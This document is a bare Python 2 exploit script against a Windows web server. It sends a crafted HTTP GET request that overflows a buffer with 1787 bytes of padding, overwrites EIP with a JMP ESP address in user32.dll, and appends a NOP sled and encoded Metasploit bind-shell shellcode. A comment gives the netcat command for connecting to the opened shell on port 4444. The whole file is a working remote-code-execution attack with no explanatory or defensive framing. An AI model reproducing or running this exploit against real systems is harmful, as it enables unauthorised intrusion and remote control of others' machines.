#!/usr/bin/python
# nc 192.168.1.4 4444
#

import socket, sys

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((sys.argv[1], 80))

buffer = "GET "

# 1787 bytes until EIP gets overwritten
buffer += "A"*1787

# JMP ESP in user32.dll
buffer += "\x13\x53\x45\x7e"

# NOPSLED
buffer += "\x90"*16

# msfpayload windows/shell_bind_tcp R | msfencode -a x86 -b "\x00\x0d" -t c
buffer += ("\xda\xcb\xd9\x74\x24\xf4\xbe\xac\xab\x7c\x33\x5f\x33\xc9\xb1"
"\x56\x31\x77\x18\x83\xc7\x04\x03\x77\xb8\x49\x89\xcf\x28\x04"
"\x72\x30\xa8\x77\xfa\xd5\x99\xa5\x98\x9e\x8b\x79\xea\xf3\x27"
"\xf1\xbe\xe7\xbc\x77\x17\x07\x75\x3d\x41\x26\x86\xf3\x4d\xe4"
"\x44\x95\x31\xf7\x98\x75\x0b\x38\xed\x74\x4c\x25\x1d\x24\x05"
"\x21\x8f\xd9\x22\x77\x13\xdb\xe4\xf3\x2b\xa3\x81\xc4\xdf\x19"
"\x8b\x14\x4f\x15\xc3\x8c\xe4\x71\xf4\xad\x29\x62\xc8\xe4\x46"
"\x51\xba\xf6\x8e\xab\x43\xc9\xee\x60\x7a\xe5\xe3\x79\xba\xc2"
"\x1b\x0c\xb0\x30\xa6\x17\x03\x4a\x7c\x9d\x96\xec\xf7\x05\x73"
"\x0c\xd4\xd0\xf0\x02\x91\x97\x5f\x07\x24\x7b\xd4\x33\xad\x7a"
"\x3b\xb2\xf5\x58\x9f\x9e\xae\xc1\x86\x7a\x01\xfd\xd9\x23\xfe"
"\x5b\x91\xc6\xeb\xda\xf8\x8e\xd8\xd0\x02\x4f\x76\x62\x70\x7d"
"\xd9\xd8\x1e\xcd\x92\xc6\xd9\x32\x89\xbf\x76\xcd\x31\xc0\x5f"
"\x0a\x65\x90\xf7\xbb\x05\x7b\x08\x43\xd0\x2c\x58\xeb\x8a\x8c"
"\x08\x4b\x7a\x65\x43\x44\xa5\x95\x6c\x8e\xd0\x91\xa2\xea\xb1"
"\x75\xc7\x0c\x24\xda\x4e\xea\x2c\xf2\x06\xa4\xd8\x30\x7d\x7d"
"\x7f\x4a\x57\xd1\x28\xdc\xef\x3f\xee\xe3\xef\x15\x5d\x4f\x47"
"\xfe\x15\x83\x5c\x1f\x2a\x8e\xf4\x56\x13\x59\x8e\x06\xd6\xfb"
"\x8f\x02\x80\x98\x02\xc9\x50\xd6\x3e\x46\x07\xbf\xf1\x9f\xcd"
"\x2d\xab\x09\xf3\xaf\x2d\x71\xb7\x6b\x8e\x7c\x36\xf9\xaa\x5a"
"\x28\xc7\x33\xe7\x1c\x97\x65\xb1\xca\x51\xdc\x73\xa4\x0b\xb3"
"\xdd\x20\xcd\xff\xdd\x36\xd2\xd5\xab\xd6\x63\x80\xed\xe9\x4c"
"\x44\xfa\x92\xb0\xf4\x05\x49\x71\x04\x4c\xd3\xd0\x8d\x09\x86"
"\x60\xd0\xa9\x7d\xa6\xed\x29\x77\x57\x0a\x31\xf2\x52\x56\xf5"
"\xef\x2e\xc7\x90\x0f\x9c\xe8\xb0")

buffer += " HTTP/1.1\r\n\r\n"

sock.send(buffer)
print '[*] --> Payload sent successfully'
print '[*] --> w00t!w00t!'
sock.close()
